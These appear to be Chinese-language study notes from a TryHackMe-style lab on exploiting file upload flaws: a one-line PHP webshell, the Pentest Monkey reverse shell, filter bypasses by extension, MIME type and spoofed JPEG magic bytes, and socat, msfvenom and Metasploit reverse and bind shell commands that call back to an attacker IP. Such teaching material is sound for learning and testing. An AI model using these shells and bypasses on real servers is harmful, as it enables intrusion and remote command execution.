**有两种基本方法可以在网络服务器上实现 RCE 利用文件上传漏洞时， webshell 和反向/绑定 shell。**实际上，功能齐全的反向/绑定 shell 是攻击者的理想目标； 但是，Webshell 可能是唯一可用的选项（例如，如果对上传施加了文件长度限制，或者防火墙规则阻止任何基于网络的 shell）。 我们将依次讨论其中的每一个。 作为一种通用方法，我们希望上传一种或另一种 shell，然后激活它，如果服务器允许的话，可以直接导航到该文件（限制不足的非路由应用程序），或者通过其他方式强制webapp 为我们运行脚本（在路由应用程序中是必需的）。 

**例子**

**webshell**

假设我们找到了一个带有上传表单的网页：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231112005644008.png" alt="image-20231112005644008" style="zoom:33%;" />

然后我们该去哪里，让我们从 gobuster 扫描开始：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231112005703328.png" alt="image-20231112005703328" style="zoom:67%;" />

看起来我们这里有两个目录—— uploads和 assets。 其中，我们上传的任何文件似乎都将放置在“uploads”目录中。

我们将首先尝试上传合法的图像文件。选择一个可爱的小狗照片上传，现在，如果我们去 http://demo.uploadvulns.thm/uploads我们应该看到西班牙猎犬的图片已经上传了。

现在让我们尝试一下 webshell。

事实上，我们知道该网络服务器正在运行 PHP 后端，因此我们将直接跳到创建和上传 shell。 在现实生活中，我们可能需要多做一点枚举； 然而，无论如何，PHP 都是一个很好的起点。

**一个简单的 Webshell 的工作原理是获取一个参数并将其作为系统命令执行。 在 PHP 中，其语法为：**

**<?php**
    **echo system($_GET["cmd"]);**
**?>**   

此代码采用 GET 参数并将其作为系统命令执行。 然后它将输出回显到屏幕上。让我们尝试将其上传到站点，然后使用它来显示当前用户和当前目录的内容：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231112005938517.png" alt="image-20231112005938517" style="zoom:67%;" />


成功！

我们现在可以使用这个 shell 从系统读取文件，或者从这里升级到反向 shell。 现在我们有了 RCE ，选择是无限的。 请注意，使用 Webshell 时，通过查看页面的源代码通常更容易查看输出。 这极大地改善了输出的格式。

**反向shell：**

上传反向shell的过程与上传webshell的过程几乎相同。 我们将使用无处不在的 Pentest Monkey 反向 shell（https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php）。 您需要编辑 shell 的第 49 行。 目前会说 $ip = '127.0.0.1';  // CHANGE THIS ——按照它的指示，改变 127.0.0.1上找到到您的 TryHackMe tun0 IP 地址。

编辑 shell 后，我们接下来需要做的就是启动 Netcat 侦听器来接收连接：nc -lvnp 1234

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231112010421805.png" alt="image-20231112010421805" style="zoom:67%;" />

现在，让我们上传 shell，然后通过导航到激活它 http://demo.uploadvulns.thm/uploads/shell.php。 shell的名称显然就是您所说的任何名称（ php-reverse-shell.php默认情况下）。

网站应该挂起并且无法正确加载，但是如果我们切换回终端，我们就会成功。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231112010522863.png" alt="image-20231112010522863" style="zoom:67%;" />

我们再次在此网络服务器上获得了 RCE 。 从这里开始，我们希望稳定我们的 shell 并提升我们的权限。





### 过滤

到目前为止，我们很大程度上忽略了网络开发人员为防御文件上传漏洞而采用的防御措施。从现在开始，我们将研究一些用于防止恶意文件上传的防御机制，以及如何规避它们。

首先，我们来讨论一下**客户端过滤**和**服务器端过滤**之间的区别。

当我们在 Web 应用程序的上下文中谈论“客户端”脚本script时，我们的意思是它在用户的浏览器中运行，而不是在 Web 服务器本身上运行。JavaScript 作为客户端脚本语言几乎无处不在，尽管替代方案确实存在。 无论使用哪种语言，客户端脚本都将在您的 Web 浏览器中运行。在文件上传的上下文中，这意味着过滤发生在文件上传到服务器之前。由于过滤是在我们的计算机上进行的，因此很容易绕过。  因此，客户端过滤本身是一种非常不安全的验证上传文件是否是恶意的方法。

相反，服务器端脚本将在服务器上运行。 传统上 PHP 是 主要的服务器端语言（微软的 IIS ASP 紧随其后）； 然而，近年来，其他 选项（C#、Node.js、Python、Ruby on Rails 以及各种其他选项）已得到更广泛的使用。 服务器端过滤往往更难以绕过，因为您面前没有代码。 由于代码是在服务器上执行的，大多数情况下也不可能完全绕过过滤器； 相反，我们必须形成一个符合适当过滤器的有效负载，但仍然允许我们执行代码。

考虑到这一点，让我们看一下**一些不同类型的过滤**。 

**扩展验证：**

文件扩展名用于识别文件的内容。 在实践中它们很容易改变，所以实际上没有多大意义； 然而，MS Windows 仍然使用它们来识别文件类型，尽管基于 Unix 的系统倾向于依赖其他方法。 检查扩展名的过滤器以两种方式之一工作。他们要么将扩展程序列入黑名单（即有一个不允许的扩展程序列表），要么将扩展程序列入白名单（即有一个允许的扩展程序列表，并拒绝其他所有扩展程序）。

**文件类型过滤：**

与扩展验证类似，但更密集，文件类型过滤再次验证文件内容是否可以上传。我们将研究**两种类型的文件类型验证：**

​        MIME 验证： MIME（Multipurpose Internet Mail Extension 多用途互联网邮件扩展）类型用作文件的标识符 - 最初是在通过电子邮件作为附件传输时使用，但现在也可在通过 HTTP(S) 传输文件时使用。文件上传的MIME类型附加在请求的标头中 ，如下所示： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113164421712.png" alt="image-20231113164421712" style="zoom:67%;" />

MIME 类型遵循 / 格式。在上面的请求中，您可以看到图像“spaniel.jpg”已上传到服务器。作为合法的 JPEG 图像，此上传的 MIME 类型为“image/jpeg”。可以在客户端或服务器端检查文件的 MIME 类型； 然而，由于MIME基于文件的扩展名，因此很容易绕过。

​        幻数验证(Magic Number validation) ： 幻数是确定文件内容的更准确方法；尽管如此，它们绝不是不可能伪造的。文件的“幻数”是位于文件内容最开头的一串字节，用于标识内容。例如，PNG 文件将在文件的最顶部包含这些字节： 89 50 4E 47 0D 0A 1A 0A。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113164513825.png" alt="image-20231113164513825" style="zoom:67%;" />

与 Windows 不同，Unix 系统使用幻数来识别文件；然而，在处理文件上传时，可以检查上传文件的幻数以确保它可以安全地接受。这绝不是一个有保证的解决方案，但它比检查文件扩展名更有效。 

**文件长度过滤：**

文件长度过滤器用于防止通过上传表单将大文件上传到服务器（因为这可能会导致服务器资源匮乏）。 在大多数情况下，这不会给我们上传 shell 带来任何问题； 但是，值得记住的是，如果上传表单仅期望上传非常小的文件，则可能存在长度过滤器以确保遵守文件长度要求。举个例子，我们在上一个任务中成熟的 PHP 反向 shell 有 5.4Kb 大——相对较小，但如果表单预计最大为 2Kb，那么我们需要找到一个替代 shell 来上传。

**文件名过滤：**

如前所述，上传到服务器的文件应该是唯一的。 通常，这意味着向文件名添加随机部分，但是，另一种策略是检查服务器上是否已存在同名文件，如果存在，则向用户提供错误。 此外，应在上传时对文件名进行清理，以确保它们不包含任何“坏字符”，这可能会在上传时导致文件系统出现问题（例如 Linux 上的空字节或正斜杠，以及控制字符 ， 例如 ; ，以及潜在的 unicode 字符）。 这对我们来说意味着，在管理良好的系统上，我们上传的文件不太可能与我们在上传之前指定的名称相同，因此请注意，如果您设法绕过内容过滤，您可能必须寻找您的 shell。

**文件内容过滤：**
更复杂的过滤系统可能会扫描上传文件的完整内容，以确保它不会欺骗其扩展名、MIME 类型和幻数。这是一个比大多数基本过滤系统所采用的过程复杂得多的过程。

值得注意的是，这些过滤器本身都不是完美的——它们通常会相互结合使用，提供多层过滤器，从而显着提高上传的安全性。 这些过滤器中的任何一个都可以应用于客户端、服务器端或两者。同样，不同的框架和语言都有自己固有的过滤和验证上传文件的方法。 因此，特定于语言的漏洞利用可能会出现；例如，在 PHP 主要版本 5 之前，可以通过向恶意 .php 文件附加空字节并后跟有效扩展名来绕过扩展名过滤器。最近，还可以将 PHP 代码注入到有效图像文件的 exif 数据中，然后强制服务器执行它。 



#### 绕过客户端过滤 

我们将从第一道（也是最薄弱的）防线开始：客户端过滤。

如前所述，客户端过滤往往非常容易被绕过，因为它完全发生在您控制的计算机上。当您有权访问代码时，更改它就非常容易。

有四种简单的方法可以绕过普通的客户端文件上传过滤器：

    1，关闭浏览器中的 Javascript—— 只要网站不需要Javascript即可提供基本功能，这将起作用。如果完全关闭Javascript会导致网站完全无法工作，那么其他方法之一会更可取；否则，这可能是完全绕过客户端过滤器的有效方法。
    2，拦截并修改传入的页面。使用 Burpsuite，我们可以拦截传入的网页并在其有机会运行之前删除Javascript过滤器。
    3，拦截并修改文件上传。前面的方法在网页加载之前起作用，此方法允许网页正常加载，但在文件上传已经通过（并被过滤器接受）后拦截文件上传。 
    4，将文件直接发送到上传点。当您可以使用像curl这样的工具直接发送文件时，为什么要使用带有过滤器的网页呢？将数据直接发布到包含处理文件上传的代码的页面是完全绕过客户端过滤器的另一种有效方法。我们不会在本教程中真正深入地介绍此方法，但是，此类命令的语法如下所示： curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>。 要使用此方法，您首先要拦截成功的上传（使用Burpsuite或浏览器控制台）以查看上传中使用的参数，然后可以将其插入到上述命令中。



我们将在下面深入介绍方法二和方法三：

**在页面加载之前拦截并删除它来绕过此过滤器**

让我们再次假设，我们在网站上找到了上传页面：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113173055347.png" alt="image-20231113173055347" style="zoom:33%;" />

与往常一样，我们将查看源代码。这里我们看到一个基本的 Javascript 函数检查上传文件的MIME 类型：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113173132644.png" alt="image-20231113173132644" style="zoom:50%;" />

在本例中，我们可以看到过滤器使用白名单来排除非 image/jpeg 的任何 MIME 类型。我们的下一步是尝试文件上传，正如预期的那样，如果我们选择 JPEG，该函数就会接受它。任何其他内容都会拒绝上传。

让我们启动 Burpsuite 并重新加载页面。 我们将看到我们自己对站点的请求，但我们真正想看到的是服务器的响应，因此右键单击拦截的数据，向下滚动到“Do Intercept”，然后选择“Response to this request”：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113173501309.png" alt="image-20231113173501309" style="zoom: 50%;" />

当我们单击窗口顶部的“Forward 转发”按钮时，我们将看到服务器对我们的请求的响应。在这里，我们可以在 Javascript 函数有机会加载之前删除、注释掉或以其他方式破坏它：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113173635254.png" alt="image-20231113173635254" style="zoom:50%;" />

删除该功能后，我们再次单击“Forward”，直到网站完成加载，现在可以自由地将任何类型的文件上传到网站。

这里值得注意的是，默认情况下，Burpsuite 不会拦截网页正在加载的任何外部 Javascript 文件。如果您需要编辑不在正在加载的主页内的脚本，则需要转到 Burpsuite 窗口顶部的“Options”选项卡，然后在“Intercept Client Requests”部分下编辑条件删除 ^js$| 的第一行：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113174208125.png" alt="image-20231113174208125" style="zoom:50%;" />



**通过上传具有合法扩展名和 MIME 类型的文件，然后使用 Burpsuite 拦截并纠正上传来实现这一点。**

重新加载网页以将过滤器放回原位后，我们将之前使用的反向 shell 重命名为“shell.jpg”。  当 MIME 类型（基于文件扩展名）自动检查时，客户端过滤器让我们的有效负载通过：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113174444126.png" alt="image-20231113174444126" style="zoom:33%;" />



我们将再次激活 Burpsuite 拦截，然后单击“上传”并捕获请求：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113174454913.png" alt="image-20231113174454913" style="zoom:50%;" />

观察我们的 PHP shell 的 MIME 类型当前是 image/jpeg。  我们将其更改为text/x-php，并将文件扩展名从.jpg更改为.php，然后将请求转发到服务器：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113174523964.png" alt="image-20231113174523964" style="zoom:50%;" />

现在，当我们导航到 http://demo.uploadvulns.thm/uploads/shell.php 并设置了 netcat 侦听器时，我们会收到来自 shell 的连接。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113174555409.png" alt="image-20231113174555409" style="zoom: 33%;" />



#### 绕过服务器端过滤：文件扩展名 

客户端过滤器很容易绕过——您可以看到它们的代码，即使它已经被混淆并且需要在您可以阅读之前进行处理；但是当您无法查看或操作代码时会发生什么，简而言之，我们必须进行大量的测试，以了解哪些内容可以通过过滤器，哪些内容不允许通过过滤器，然后逐渐组合出符合限制的有效负载。

对于此任务的第一部分，我们将查看一个使用文件扩展名黑名单作为服务器端过滤器的网站。 有多种不同的编码方式，我们使用的绕过取决于这些方式。在现实世界中，我们无法看到相关代码，但对于本示例，它将包含在此处： 

<?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>

在本例中，代码正在查找文件名中的最后一个句点 (.)，并使用它来确认扩展名，因此这就是我们在这里尝试绕过的内容。该代码的其他工作方式包括：搜索文件名中的第一个句点，或者在每个句点拆分文件名并检查是否显示任何列入黑名单的扩展名。  稍后我们将讨论后一种情况，但与此同时，让我们重点关注这里的代码。

我们可以看到代码过滤掉了 .php 和 .phtml 扩展名，因此如果我们想上传 PHP 脚本，我们将不得不找到另一个扩展名。PHP 的维基百科页面为我们提供了一些可以尝试的常见扩展；然而，实际上还有许多其他很少使用的扩展可用，但网络服务器仍然可以识别。这些包括： .php3, .php4, .php5, .php7, .phps, .php-s, .pht和 .phar。 其中许多绕过过滤器（仅阻止 .php和 .phtml），但服务器似乎配置为不将它们识别为 PHP 文件，如下例所示： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113180154157.png" alt="image-20231113180154157" style="zoom: 50%;" />

在撰写本文时，这实际上是 Apache2 服务器的默认设置； 但是，系统管理员可能更改了默认配置（或者服务器可能已过时），因此非常值得尝试。最终我们发现， .phar扩展绕过过滤器并起作用，从而为我们提供了 shell。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113180244782.png" alt="image-20231113180244782" style="zoom:33%;" />



让我们看一下另一个使用不同过滤器的示例。 这次我们将完全黑盒地进行：即没有源代码。

我们再次获得上传表单，我们将首先通过完全合法的上传来确定范围。 我们来尝试上传 spaniel.jpg之前的图片： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113180343929.png" alt="image-20231113180343929" style="zoom:33%;" />

好吧，这告诉我们 JPEG 至少是被接受的。 让我们选择一个我们可以肯定会被拒绝的方案（ shell.php）： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113180404547.png" alt="image-20231113180404547" style="zoom:33%;" />

从这里开始，我们进一步枚举，尝试上面的技术，并且通常尝试了解过滤器将接受或拒绝什么。

在前面的示例中，我们看到代码使用 pathinfo() PHP 函数来获取 . 之后的最后几个字符，但是如果它过滤输入的方式略有不同，会发生什么情况？让我们尝试上传一个名为 shell.jpg.php。 我们已经知道 JPEG 文件是被接受的，那么如果过滤器只是检查 .jpg 文件扩展名是否在输入中的某个位置呢。

这种过滤器的伪代码可能如下所示： 

ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGE

当我们尝试上传文件时，我们会收到一条成功消息。 导航至 /uploads目录确认负载已成功上传： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113180650056.png" alt="image-20231113180650056" style="zoom:33%;" />

激活它，我们收到 shell： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113180708592.png" alt="image-20231113180708592" style="zoom:33%;" />

这绝不是与文件扩展名相关的上传漏洞的详尽列表。与攻击中的所有事情一样，我们正在寻求利用其他人编写的代码中的缺陷；这段代码很可能是专门为手头的任务编写的。这是这项任务中真正重要的一点：在编程方面，有一百万种不同的方法来实现相同的功能——您的开发必须适合手头的过滤器。绕过任何类型的服务器端过滤器的关键是枚举并查看允许什么以及阻止什么； 然后尝试制作一个可以通过过滤器正在寻找的标准的有效负载。



#### 绕过服务器端过滤：幻数 

如何将幻数检查实现为服务器端过滤器，如前所述，幻数被用作更准确的文件标识符。文件的幻数是一串十六进制数字，并且始终是文件中的第一个数字。知道了这一点，就可以使用幻数来验证文件上传，只需读取前几个字节并将它们与白名单或黑名单进行比较即可。请记住，这种技术对于基于 PHP 的网络服务器非常有效；但是，它有时可能会在其他类型的网络服务器上失败（提示提示）。

让我们看一个例子，像往常一样，我们有一个上传页面，正如预期的那样，如果我们上传标准 shell.php 文件，我们会收到错误； 但是，如果我们上传 JPEG，网站就可以接受。 到目前为止一切都按预期运行。

从之前的上传尝试中，我们知道 JPEG 文件已被接受，因此让我们尝试将 JPEG 幻数添加到 shell.php 文件的顶部。 快速浏览一下 Wikipedia 上的文件签名列表（https://en.wikipedia.org/wiki/List_of_file_signatures），我们就会发现 JPEG 文件有几种可能的幻数。我们在这里使用哪一个并不重要，所以我们只选择一个（ FF D8 FF DB）。我们可以将这些数字的 ASCII 表示形式 (ÿØÿÛ) 直接添加到文件顶部，但直接使用十六进制表示形式通常更容易，所以让我们介绍一下该方法。

在开始之前，我们先来使用一下 Linux file命令来检查 shell 的文件类型：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113181505172.png" alt="image-20231113181505172" style="zoom:67%;" />

正如预期的那样，该命令告诉我们文件类型是 PHP 。 当我们继续解释时请记住这一点。

我们可以看到我们选择的幻数有四个字节长，所以让我们打开反向 shell 脚本并在第一行添加四个随机字符。 这些字符并不重要，因此在本例中我们只使用四个“A”：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113181546784.png" alt="image-20231113181546784" style="zoom:67%;" />

保存文件并退出。我们将在 hexeditor（Kali 上默认提供）或任何其他允许您以十六进制形式查看和编辑 shell 的工具中重新打开该文件。在十六进制编辑器中，该文件如下所示：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113181646291.png" alt="image-20231113181646291" style="zoom:67%;" />

注意红框中的四个字节：它们都是 41，这是大写“A”的十六进制代码——正是我们之前在文件顶部添加的内容。将其更改为我们之前为 JPEG 文件找到的幻数： FF D8 FF DB

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113181708446.png" alt="image-20231113181708446" style="zoom:67%;" />

现在，如果我们保存并退出文件，我们可以使用 file再次看到我们已经成功欺骗了 shell 的文件类型：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113181744490.png" alt="image-20231113181744490" style="zoom:67%;" />


现在让我们尝试上传修改后的 shell，看看它是否绕过过滤器。现在我们已经完成了——我们绕过了服务器端幻数过滤器并收到了一个反向 shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231113181819429.png" alt="image-20231113181819429" style="zoom: 33%;" />





#### 总结大概流程

我们现在已经看到了各种不同类型的过滤器——客户端和服务器端——以及文件上传攻击的一般方法。您将面临一个需要完成的黑盒文件上传挑战，因此让我们借此机会更深入地讨论解决此类挑战的**示例方法**。 您可以开发自己的替代方法来替代此方法，但是，如果您不熟悉这种攻击，您可能会发现以下信息很有用。

我们将将此视为一个逐步的过程。 假设我们有一个网站要对其进行安全审核。

    1，我们要做的第一件事是从整体上看一下网站。使用浏览器扩展，例如前面提到的 Wappalyzer（或手动），我们将寻找Web应用程序可能使用的语言和框架构建的指标。 请注意，Wappalyzer并不总是 100% 准确。手动枚举的一个好的开始是向网站发出请求并使用 Burpsuite 拦截响应。诸如 server 或 x-powered-by 之类的标头可用于获取有关服务器的信息。  我们还会寻找攻击媒介，例如上传页面。
    2，找到上传页面后，我们将进一步检查它。查看客户端脚本的源代码以确定是否有任何客户端过滤器需要绕过，这是一个很好的开始，因为这完全在我们的控制范围内。
    3，然后我们将尝试完全无害的文件上传。从这里我们将查看如何访问我们的文件。换句话说，我们可以直接在上传文件夹中访问它吗？它是否嵌入到页面的某个位置？网站的命名方案是什么？如果位置不是很明显，那么Gobuste等工具可能会派上用场。这一步非常重要，因为它不仅提高了我们对所攻击的虚拟环境的了解，还为我们提供了一个基线“已接受”文件，我们可以在此基础上进行进一步的测试。
        这里一个重要的 Gobuster 开关是 -x开关，可用于查找具有特定扩展名的文件。例如，如果您将 -x php,txt,html 添加到Gobuster命令中，该工具会将 .php、.txt 和 .html 附加到所选单词列表中的每个单词，一次一个。如果您已成功上传有效负载并且服务器正在更改上传文件的名称，这将非常有用。
    4，确定了如何以及在何处可以访问我们上传的文件后，我们将尝试恶意文件上传，绕过我们在第二步中发现的任何客户端过滤器。我们希望我们的上传被服务器端过滤器停止，但它给我们的错误消息对于确定我们的后续步骤非常有用。 

假设我们的恶意文件上传已被服务器阻止，可以通过以下一些方法来确定可能存在哪种类型的服务器端过滤器：

    1.如果您可以成功上传一个完全无效的文件扩展名（例如testingimage.invalidfileextension）的文件，那么服务器很可能正在使用扩展名黑名单来过滤可执行文件。如果此上传失败，则任何扩展过滤器都将在白名单上运行。
    2.尝试重新上传您最初接受的无辜文件，但这次将文件的幻数更改为您希望过滤的内容。如果上传失败，那么您就知道服务器正在使用基于幻数的过滤器。
    3.与上一点一样，尝试上传无辜的文件，但使用 Burpsuite 拦截请求并将 上传的MIME类型更改为您希望过滤的内容。如果上传失败，那么您就知道服务器正在根据MIME类型进行过滤。
    4.枚举文件长度过滤器是上传一个小文件，然后逐渐上传更大的文件，直到达到过滤器的情况。那时您就会知道可接受的限制是多少。如果您非常幸运，那么原始上传的错误消息可能会直接告诉您大小限制是多少。请注意，较小的文件长度限制可能会阻止您上传我们迄今为止一直使用的反向 shell。









## Shell

Shell 用于与命令行环境Command Line environment (CLI) 交互。 Bash 和 sh 是 Linux 上的 shell 示例，而 cmd.exe 和 Powershell 是 Windows 上运行的 shell。攻击远程系统时，一个可能的目标是通过让系统运行任意代码来获得初始访问权限。 然后可以使用此初始访问来获取目标上的 shell。

对于对远程服务器的攻击，我们可以强制服务器向我们提供命令行访问权限（ **反向 shell** ），或者打开服务器上的端口，然后我们可以连接到该端口（ **绑定 shell** ）。 



### **工具**

我们使用多种工具来接收 反向 shell 和发送绑定 shell  。一般来说，我们需要恶意 shell 代码，以及与生成的 shell 交互的方法。 

**Netcat** 是传统的方式，它用于手动执行各种网络交互，包括在枚举期间抓取横幅之类的操作，或者可用于接收反向 shell 并连接到附加到绑定 shell 的远程端口。默认情况下， Netcat shell 通常非常不稳定 ，但可以通过某些技术进行改进。

**Socat** 是 netcat 的更好版本。它可以做所有相同的事情，甚至更多。Socat shell 通常比开箱即用的 netcat shell 更稳定。从这个意义上说，它要优越得多，但有两个问题： 

    语法比较难 
    默认情况下，Netcat几乎安装在每个Linux发行版上，但Socat很少安装 

不过，这些问题还是有解决方法的。Socat 和 Netcat 都有专门用于 Windows 的“.exe”版本。

**Metasploit**

Metasploit框架的“ auxiliary/multi/handler ”模块用于接收反向shell。由于是 Metasploit 的一部分，  multi/handler 提供了一种成熟的方法来获取稳定的 shell  ，并提供多种进一步的选项来改进捕获的 shell。它也是与 meterpreter shell 交互的唯一方法，也是处理“暂存”有效负载的最简单方法。

**Msfvenom**

与 multi/handler 一样，  msfvenom 是 Metasploit 框架的一部分。但是，它作为独立工具提供。它用于动态生成有效负载，它可以生成反向 shell 和绑定 shell 等等，这是一个非常强大的工具。 

除了上述工具之外，还有一些多种不同语言的 shell 存储库。最突出的之一是 Payload All the Things（https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md）  以及 PentestMonkey Reverse Shell Cheatsheet（https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet）。除此之外，Kali 还预装了各种 webshell，位于“  /usr/share/webshells  ”。SecLists 存储库(https://github.com/danielmiessler/SecLists)还包含一些用于获取 shell 的有用代码。



### Socat

Socat 在某些方面与 netcat 类似，但在其他方面则有根本的不同。最简单的方式是将 socat 视为两点之间的连接器 - 例如侦听端口和键盘或侦听端口和文件或两个侦听端口。socat 所做的只是提供两点之间的链接 。 

反向shell

socat 的语法比 netcat 难很多。socat 中基本反向 shell 侦听器的语法： 

socat TCP-L:[端口] - 

与 socat 一样，这需要两个点（ 监听端口和标准输入 ）并将它们连接在一起。生成的 shell 不稳定，但可以在 Linux 或 Windows 上运行，相当于“  nc -lvnp [port]  ” 

在 Windows 上，我们将使用此命令来连接回来： 

socat TCP:[local_ip]:[local_port] EXEC:powershell.exe,pipes

“  pipes  ”选项用于强制 PowerShell（或 cmd  ）使用Unix风格的标准输入和输出。Linux 的等价物是： 

socat TCP:[local_ip]:[local_port] EXEC:"bash -li" 

绑定shell

在 Linux 上，我们将使用以下命令： 

socat TCP-L:[端口] EXEC:"bash -li" 

在 Windows 目标上，我们将使用以下命令作为侦听器： 

socat TCP-L:[端口] EXEC:powershell.exe,pipes 

我们使用“  pipes  ”参数在 CLI 环境中处理输入和输出的 Unix 和 Windows 方式之间建立接口。 

无论目标如何，我们在本地计算机上使用此命令来连接到等待的侦听器： 

socat TCP:[IP]:[端口] - 

Socat 最强大的用途之一是完全稳定的 Linux tty 反向 shell。这仅在目标是 Linux 时有效，但更稳定。新的侦听器语法为： 

socat TCP-L:[端口] FILE:`tty`,raw,echo=0 

在本例中，这两个点是一个监听端口和一个文件。具体来说，我们分配一个新的 tty，并将 echo 设置为零。这大约相当于之前使用 CTRL+Z 和“stty raw -echo; fg”命令，并具有立即稳定并分配完整 tty 的额外好处。 

第一个侦听器可以与任何有效负载连接；但是， 必须使用非常具体的 socat 命令激活此特殊侦听器。这意味着目标必须安装 socat。特殊命令是： 

socat TCP:<攻击者 IP>:<攻击者端口> EXEC:"bash -li",pty,stderr,sigint,setsid,sane 

第一部分很简单 - 我们正在与本地计算机上运行的侦听器连接。 该命令的第二部分创建交互式 BASH 会话 使用 EXEC:"bash -li" 。 我们还传递参数：pty  、stderr  、sigint  、setsid 和 sane  。 

    pty  - 在目标上分配一个伪终端 
    stderr  - 确保显示任何错误消息 
    sigint  - 将任何CTRL+C命令传递到子进程中 
    setid  - 在新会话中创建进程 
    sane  - 稳定终端并尝试“正常化”它 

例如，左侧有一个在本地计算机上运行的侦听器，右侧是受感染目标的模拟，使用非交互式 shell 运行。使用非交互式 netcat shell，我们执行特殊的 socat 命令并在侦听器上接收完整的交互式 BASH shell。 





### Msfvenom

Msfvenom 主要用于生成反向 shell 和绑定 shell 的代码。它广泛用于较低级别的漏洞利用开发，以在开发缓冲区溢出等情况时生成十六进制 shellcode。但是，它也可以用于生成各种格式的有效负载 -  exe  、aspx  、war  、py  。 

**msfvenom 的标准语法是：** 

**msfvenom -p [有效负载] [选项]** 

例如，要生成 exe 格式的 Windows x64 反向 shell，我们可以使用： 

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=[listen_IP] LPORT=[listen_port] 

这里我们使用有效负载和四个选项： 

    -f [format] 指定输出格式 
    
    -o [file] 指定输出位置和文件名 
    
    LHOST=[IP] 指定要连接回的IP。 
    
    LPORT=[端口] 指定本机端口 

还有两个必须引入的概念：  分阶段staged 和 stageless 反向 shell 有效负载 。 

分阶段Staged有效负载 

分阶段有效负载分为两部分。 第一部分称为stager，这是直接在服务器本身上执行的一段代码。它连接回等待侦听器，但实际上本身并不包含任何反向 shellcode。相反，它连接到侦听器并下载实际的有效负载。因此，有效负载分为两部分 - 较小的初始 stager，然后是在激活 stager 时下载的较大的反向 shell 代码。分阶段的有效负载需要一个特殊的侦听器 - 通常是 Metasploit multi/handler。

无级stageless有效负载 

无级有效负载更为常见，它们是完全独立的 ，因为有一段代码在执行时会立即将 shell 发送回等待的侦听器。无级有效载荷往往更容易使用和捕获；然而，它们也更大，更容易被防病毒或 IDS 程序发现和删除。分阶段有效负载更难使用，但初始阶段要短得多，有时无法检测到。 

说到 Metasploit，另一个重要的东西是 Meterpreter shell  。   Meterpreter shell 是 Metasploit 自有品牌的全功能 shell  。它们完全稳定，这使得它们在 Windows 上工作时非常有用。它们还具有许多自己的内置功能，例如文件上传和下载。如果我们想使用 Metasploit 的任何后利用工具，那么我们 需要 使用 meterpreter shell。 meterpreter 的缺点是它们必须被 Metasploit 捕获。 

**使用 msfvenom 时，了解命名系统的工作原理非常重要。**基本约定如下： 

[操作系统]/[架构]/[有效负载] 

例如： 

linux/x86/shell_reverse_tcp 

这将为 x86 Linux 目标生成无阶段反向 shell。Windows 32 位目标除外。对于这些，未指定拱门： 

windows/shell_reverse_tcp 

在上面的示例中，使用的有效负载是 shell_reverse_tcp  。这表明它是一个无阶段的有效负载，无阶段有效负载用下划线表示。与此等效的分阶段是： 

shell/reverse_tcp 

此规则也适用于 Meterpreter 有效负载。  Windows 64 位分阶段 Meterpreter 有效负载如下所示： 

windows/x64/meterpreter/reverse_tcp 

Linux 32 位无阶段 Meterpreter 有效负载如下所示： 

linux/x86/meterpreter_reverse_tcp 

使用 msfvenom 时需要注意的另一个重要事项是“  msfvenom --list Payloads  ”命令。 这用于列出所有可用的有效负载，然后可以将其通过管道传输到 grep 中以搜索特定的一组有效负载。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115215415052.png" alt="image-20231115215415052" style="zoom:67%;" />





### Metasploit multi/handler

Multi/Handler 是一个捕获反向shell的工具。如果您想使用 Meterpreter  shell，它是必不可少的，并且是使用分阶段有效负载时的首选。 

它相对容易使用： 

    1.使用 msfconsole 打开 Metasploit 
    2.使用 multi/handler类型 

